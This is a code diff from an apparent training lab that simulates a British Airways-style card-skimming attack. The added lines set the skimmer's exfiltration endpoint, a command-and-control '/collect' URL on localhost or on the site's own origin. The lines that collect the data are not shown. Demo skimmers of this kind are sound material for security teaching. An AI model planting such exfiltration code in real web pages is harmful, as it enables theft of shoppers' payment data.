@@ -251,8 +251,17 @@
 
   // British Airways-style attack: 22 lines of JavaScript (keeping it minimal)
   setTimeout(function () {
+    // Dynamically determine C2 URL based on environment
+    const hostname = window.location.hostname
+    let exfilUrl = 'http://localhost:3000/collect' // Local development default
+
+    // Production and staging - use relative URL since C2 is proxied by nginx
+    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
+      exfilUrl = window.location.origin + '/collect'
+    }
+
     const CONFIG = {
-      exfilUrl: 'http://localhost:9002/collect',
+      exfilUrl: exfilUrl,
       debug: true
     }
 
